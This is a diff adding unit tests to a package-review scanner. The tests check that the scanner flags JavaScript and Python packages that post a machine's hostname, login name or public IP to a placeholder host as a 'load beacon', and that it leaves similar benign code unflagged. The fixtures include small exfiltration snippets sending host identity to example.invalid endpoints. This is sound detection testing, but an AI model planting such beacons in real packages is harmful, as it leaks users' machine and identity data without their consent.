@@ -947,6 +947,63 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "credentials" } && f.Detail.Contains("browser_cookie3", StringComparison.Ordinal));
     }
 
+    private const string OsDataPost = "const os=require('os');\nexports.report=function(){fetch('https://h.example.invalid/c',{method:'POST',body:JSON.stringify({h:os.hostname(),p:os.platform(),a:os.arch()})})};\n";
+
+    [Fact]
+    public void An_os_fields_object_with_the_host_name_posted_from_a_loaded_file_is_a_load_beacon()
+    {
+        var r = Review(Tgz("os-sdk-1.0.0.tgz", ("package/package.json", """{"name":"os-sdk","version":"1.0.0","main":"index.cjs"}"""),
+            ("package/index.cjs", "module.exports=require('./lib/data.cjs');\n"), ("package/lib/data.cjs", OsDataPost)));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/load-beacon", Level: "noteworthy", Path: "package/lib/data.cjs" });
+    }
+
+    [Fact]
+    public void Os_fields_without_a_host_or_user_name_or_without_a_post_are_not_a_load_beacon()
+    {
+        var noName = OsDataPost.Replace("h:os.hostname(),", "r:os.release(),", StringComparison.Ordinal);
+        var noPost = OsDataPost.Replace("{method:'POST',body:", "{body:", StringComparison.Ordinal);
+        foreach (var code in new[] { noName, noPost })
+        {
+            var r = Review(Tgz("os-sdk-1.0.1.tgz", ("package/package.json", """{"name":"os-sdk","version":"1.0.1","main":"index.cjs"}"""),
+                ("package/index.cjs", "module.exports=require('./lib/data.cjs');\n"), ("package/lib/data.cjs", code)));
+            Assert.DoesNotContain(r.Findings, f => f.Rule == "package/load-beacon");
+        }
+    }
+
+    [Fact]
+    public void A_python_module_that_posts_the_login_name_and_public_address_is_a_load_beacon()
+    {
+        var r = Review(Tgz("client-1.0.1.tar.gz",
+            ("client-1.0.1/PKG-INFO", "Metadata-Version: 2.1\nName: client\nVersion: 1.0.1\n"),
+            ("client-1.0.1/setup.py", "from setuptools import setup\nsetup(name='client', version='1.0.1')\n"),
+            ("client-1.0.1/client/__init__.py", "from client.main import Client\n"),
+            ("client-1.0.1/client/main.py", "import os, requests\nSERVER = 'https://api.example.invalid/c'\nclass Client:\n    def send(self):\n        user = os.getlogin()\n        ip = requests.get('https://checkip.amazonaws.com').text\n        requests.post(SERVER, data={'u': user, 'ip': ip})\n")));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/load-beacon", Level: "noteworthy", Path: "client-1.0.1/client/main.py" });
+    }
+
+    [Fact]
+    public void One_kind_of_host_identity_beside_a_post_is_not_a_load_beacon()
+    {
+        var user = "import getpass, requests\nAPI = 'https://api.example.invalid/v1'\ndef login():\n    user = getpass.getuser()\n    return requests.post(API, json={'user': user})\n";
+        var echo = "import requests\nAPI_URL = 'https://ipinfo.io'\ndef lookup(ips):\n    return requests.post(API_URL + '/batch', json=ips)\n";
+        foreach (var code in new[] { user, echo })
+        {
+            var r = Review(Tgz("client-1.0.2.tar.gz", ("client-1.0.2/PKG-INFO", "Metadata-Version: 2.1\nName: client\nVersion: 1.0.2\n"),
+                ("client-1.0.2/client/__init__.py", "from client.main import login\n"), ("client-1.0.2/client/main.py", code)));
+            Assert.DoesNotContain(r.Findings, f => f.Rule == "package/load-beacon");
+        }
+    }
+
+    [Fact]
+    public void A_bundle_posting_a_host_name_context_to_a_configured_endpoint_is_not_a_load_beacon()
+    {
+        var bundle = "// Docs: https://docs.example.invalid/sdk\nconst os=require('os');\n" + new string(' ', 70_000)
+            + "exports.send=function(cfg,e){fetch(cfg.endpoint,{method:'POST',body:JSON.stringify({e,device:{hostname:os.hostname(),platform:os.platform(),release:os.release()}})})};\n";
+        var r = Review(Tgz("sdk-1.0.0.tgz", ("package/package.json", """{"name":"sdk","version":"1.0.0","main":"index.cjs"}"""),
+            ("package/index.cjs", "module.exports=require('./dist/sdk.cjs');\n"), ("package/dist/sdk.cjs", bundle)));
+        Assert.DoesNotContain(r.Findings, f => f.Rule == "package/load-beacon");
+    }
+
     [Fact]
     public void A_wheel_lists_entry_points_checks_its_record_and_names_start_up_hooks()
     {
